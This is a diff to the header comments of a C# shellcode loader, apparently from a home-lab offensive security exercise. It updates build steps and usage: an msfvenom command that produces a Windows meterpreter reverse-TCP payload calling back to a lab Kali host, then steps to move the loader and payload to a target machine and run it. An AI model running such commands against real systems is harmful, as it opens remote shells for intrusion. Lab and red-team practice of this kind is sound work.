@@ -29,7 +29,7 @@
 //   - Document: 05_shellcode_loader.md
 //
 // BUILD INSTRUCTIONS:
-//   On Windows 11 VM with Visual Studio 2022:
+//   On Dev Box (ammulu, 192.168.10.150) with Visual Studio 2022:
 //     csc /unsafe /out:loader01.exe 01_shellcode_loader.cs
 //   Or using dotnet CLI:
 //     dotnet new console -n Loader01
@@ -37,10 +37,12 @@
 //     dotnet build
 //
 // USAGE:
-//   Generate shellcode on Kali:
-//     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI_IP> LPORT=<PORT> -f csharp
-//   Replace the placeholder shellcode bytes below with the output.
-//   Compile and run on the Windows 11 target.
+//   1. Generate shellcode on Kali (192.168.10.200):
+//        msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.200 LPORT=<PORT> -f raw -o payload.bin
+//   2. Compile on Dev Box (ammulu).
+//   3. Transfer loader01.exe and payload.bin to Target (kimjongun, 192.168.10.100).
+//   4. Run on Target:
+//        loader01.exe payload.bin
 //
 // ============================================================================
 
